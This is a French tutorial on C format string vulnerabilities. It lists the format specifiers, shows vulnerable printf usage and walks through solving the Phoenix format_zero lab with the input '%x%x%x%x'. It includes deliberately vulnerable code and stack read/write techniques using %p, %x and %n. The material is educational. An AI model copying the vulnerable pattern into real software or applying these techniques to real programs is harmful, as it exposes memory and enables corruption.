# Qu'est-ce que c'est ?

## Vocabulaire

### Chaine de format :
- chaine de caractère contenant des spécificateurs de format permet à des fonctions comme `printf()` d'avoir le détail dequoi afficher en quel type de donnée
- liste de chaines de caractères :
	- `%d` & `%i` : integer (`%d` seulement decimal via `scanf()`)
	- `%u` : interger non signé (seulement positif)
	- `%f` : float
	- `%s` : string
	- `%x` : hexadecimal
	- `%p` : adresse mémoire
	- `%n` : nombre de caractères
- exemple :
```c
age = 22;
printf("j'ai %d ans.\n", age);
# j'ai 22 ans.
```
## définition

Lorsqu'une fonction comme `printf()` est utilisé sans format de chaine, un attaquant va pouvoir spécifier lui même des chaines de caractères ce qui va causé une divulgation de données entre autre
### exemple vulnérable :

```c
char buffer[100];
scanf("%99s", buffer);

printf(buffer);
```

# Techniques :
## Lecture

- utilisation de `%p` pour lire le contenu de la pile
- utilisation de `%s` pour lire des chaines de caractère via des adresses mémoire
- utilisation de `%x` pour lire des valeurs en hexadecimal  et voir la disposition des données dans la pile
- trouver l'offset :
## Ecriture

- utilisation de `%n` pour écrire dans l'adresse mémoire

# Exercice

## Phoenix | format_zero

### Analyse :

#### execution du code :

Nous allons d'abord exécuter le code et tester le retour que l'on peut avoir.
```bash
./format-zero 

Welcome to phoenix/format-zero, brought to you by https://exploit.education
test
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```
Nous savons qu'il faudra modifier une variable `changeme`. Allons maintenant voir le code source.
#### analyse code source :

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```
1. le programme initialise une variable `dest` de 32 octets
2. initialisation d'un entier `changeme` à 0
3. initialisation de `buffer` de 16 octets
4. `buffer` obtient l'entré utilisateur en valeur mais l'entré doit faire la taille du buffer, ensuite le dernier octet de `buffer` obtiens la valeur 0
5. la variable `dest` obtient la valeur de `buffer`
6. si `changeme` est différent de 0, nous gagnons ce challenge !
#### Exploitation :

ici pour exploiter, il faudrait donc surcharger la variable `dest` afin que son contenu déborde dans `changeme` hors la taille de `buffer` et la vérification empêchent un buffer overflow classique. Il faut donc utiliser la vulnérabilité de chaine de format qui permet d'avoir par exemple `%x` qui pour 2 octets va valoir dans `dest` 8 octets. il suffit d'en mettre plusieurs pour atteindre `changeme`.

```bash
./format-zero 

%x%x%x%x

Well done, the 'changeme' variable has been changed!
```
